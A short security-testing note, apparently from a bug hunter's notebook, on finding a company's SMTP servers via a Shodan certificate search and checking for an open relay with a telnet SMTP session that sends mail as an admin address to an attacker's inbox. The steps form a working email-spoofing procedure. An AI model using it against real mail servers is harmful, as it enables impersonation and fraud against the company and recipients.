<mark style="background: #FF5582A6;">Step 1:-</mark>
-> search in shodan with including virtual host `(services.tls.certificates.leaf_data.names: anywebsite.com) and services.service_name=`SMTP`` , then `` run the command in terminal `telnet <ip> <smtp port>` 

```
EHLO anywebsite.com  
MAIL FROM: <admin[@](mailto:chris@contoso.com)anywebsite[.com](mailto:chris@contoso.com)>  
RCPT TO: <attackers controlled email id>  
DATA  
354 Start mail input; end with <CRLF>.<CRLF>  
Subject: test`
```
See if the attacker is getting mail from admin@anywebsite.com 
Impact -> An attacker can send legitimate email on behalf of someone in the company to anyone.It can lead to fraud.